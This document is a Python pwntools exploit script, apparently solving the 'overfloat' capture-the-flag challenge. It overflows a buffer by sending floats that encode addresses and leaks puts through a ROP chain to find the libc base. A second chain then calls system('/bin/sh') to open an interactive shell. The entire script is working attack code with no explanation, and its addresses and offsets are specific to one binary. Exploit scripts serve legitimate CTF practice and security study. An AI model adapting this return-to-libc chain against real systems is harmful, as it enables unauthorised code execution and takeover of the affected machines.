from pwn import *

target = process("./overfloat")
import struct


def float_to_bin(num):
    return bin(struct.unpack('!I', struct.pack('!f', num))[0])[2:].zfill(32)

def bin_to_float(num):
    return struct.unpack('!f',struct.pack('!I', num))[0]

def send(x):
    target.recvuntil("]")
    target.sendline(x)
    print(x)

def push(x):
    send(str(bin_to_float(x & 0xffffffff)))
    send(str(bin_to_float((x & 0xffffffff00000000) >> 32)))

binsh_offset = 0x18bb62
popRDI = 0x0000000000400a83
puts_offset = 0x76ab0
putsplt = 0x400690
system_offset = 0x49de0
putsgot = 0x602020
chart_course = 0x400993

for _ in range(14):
    send("0")

push(popRDI)
push(putsgot)
push(putsplt)
push(chart_course)
send("done")

target.recvuntil("BON VOYAGE!\n")

leakedputs = target.recv(6)
puts = u64(leakedputs + "\x00"*(8-len(leakedputs)))
libcbase = puts - puts_offset
print(hex(libcbase))
binsh = libcbase + binsh_offset
system = libcbase + system_offset
for _ in range(14):
    send("0")

push(popRDI)
push(binsh)
push(system)
target.sendline("done")
target.interactive()

